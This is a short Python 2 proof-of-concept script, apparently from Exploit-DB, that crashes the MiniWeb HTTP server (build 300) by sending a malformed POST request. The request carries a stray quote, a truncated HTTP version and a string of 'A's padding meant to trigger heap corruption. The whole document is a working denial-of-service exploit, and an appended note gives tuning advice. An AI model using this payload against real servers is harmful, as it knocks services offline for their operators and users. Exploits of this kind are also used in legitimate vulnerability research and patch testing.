# MiniWeb HTTP server (build 300, built on Feb 28 2013) by Stanley Huang
# http://sourceforge.net/projects/miniweb/files/miniweb/0.8/miniweb-win32-20130309.zip/download
# Heap corruption PoC - remote DoS
# Tested on Win7 SP1 RUS
# (x) dmnt 2013

import socket

print 'Mini Web HTTP Server remote DoS exploit by dmnt\n'
host = "127.0.0.1"
port = 8000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print 'Connect to host and send payload\n'
stuff = 'POST /'+'"' +' HTTP/1.\r\n'
stuff+= 'Content-Type: application/x-www-form-urlencoded\r\n'
stuff+= 'Content-Length: 0\r\n\r\n'
stuff+= 'A'*15
s.send(stuff)
print 'Server crashed\n'

# Exploit-DB note:
# Tinker with the amount of As to get this to work